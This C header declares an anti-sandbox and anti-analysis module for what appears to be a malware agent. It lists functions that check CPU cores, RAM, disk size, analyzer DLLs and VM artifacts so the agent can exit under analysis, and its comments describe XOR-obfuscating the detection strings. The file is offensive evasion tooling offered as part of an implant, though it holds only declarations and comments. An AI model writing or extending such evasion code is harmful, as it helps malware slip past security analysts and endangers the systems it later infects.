#pragma once

#include <windows.h>

/*
 * Anti-sandbox / anti-analysis detection module.
 * Checks common indicators of sandbox/VM environments and exits early.
 *
 * Design principle: lightweight, no false-positives on real hardware,
 * and degrades gracefully if APIs aren't available.
 * 
 * All detection = compile-time XOR-obfuscated strings via StrObfuscate.h
 * for the string-based checks (file paths, device names, registry keys).
 * The hardware/CPU checks are purely numeric.
 */

#ifdef __cplusplus
extern "C" {
#endif

/* Returns TRUE if sandbox/VM indicators are found → agent should exit. */
BOOL Opsec_DetectSandbox(void);

/* Individual checks (exposed for composability) */
BOOL Opsec_CheckCpuCores(void);         /* < 2 physical cores → sandbox */
BOOL Opsec_CheckRamSize(void);          /* < 2GB RAM → sandbox */
BOOL Opsec_CheckDiskSize(void);         /* < 60GB disk → sandbox */
BOOL Opsec_CheckModulePresence(void);   /* sbiedll/analyzer DLLs → sandbox */
BOOL Opsec_CheckArtifacts(void);        /* file/reg artifacts → VM */

#ifdef __cplusplus
}
#endif
